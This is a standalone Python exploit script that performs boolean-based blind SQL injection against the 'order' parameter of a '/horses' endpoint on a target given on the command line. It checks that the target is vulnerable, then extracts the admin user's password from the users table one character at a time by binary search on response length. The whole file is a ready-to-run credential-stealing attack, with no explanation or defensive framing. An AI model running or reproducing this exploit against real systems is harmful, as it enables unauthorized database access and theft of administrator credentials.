#!/usr/bin/python3
import requests
import sys

if len(sys.argv) != 2:
	print("usage: %s TARGET" % sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]

sqli = "2 LIMIT (CASE WHEN (%s) THEN 1 ELSE 2 END)"
def oracle(query):
	evil = sqli % query
	r = requests.get("http://%s/horses?order=%s"%(target,evil))
	return r.headers['Content-Length'] < '1500'

if oracle("1=1"):
	if not oracle("1=0"):
		print("[+] Target is vulnerable!")
	else:
		print("[-] False query failed.")
		sys.exit(-1)
else:
	print("[-] True query failed.")
	sys.exit(-1)

print("[*] Dumping admin password...")
sys.stdout.write("    > ")
for i in range(1,17):
	low = 48 # '0'
	high = 57 # '9'
	mid = 0

	while low <= high:
		mid = (high + low) // 2

		if oracle("ASCII(SUBSTR((SELECT password FROM users "+\
			"WHERE user_id=1),%d,1))>%d"%(i,mid)):
			low = mid + 1

		elif oracle("ASCII(SUBSTR((SELECT password FROM users "+\
			"WHERE user_id=1),%d,1))<%d"%(i,mid)):
			high = mid - 1

		else:
			sys.stdout.write(chr(mid))
			sys.stdout.flush()
			break

sys.stdout.write("\n")
print("[+] Done!")
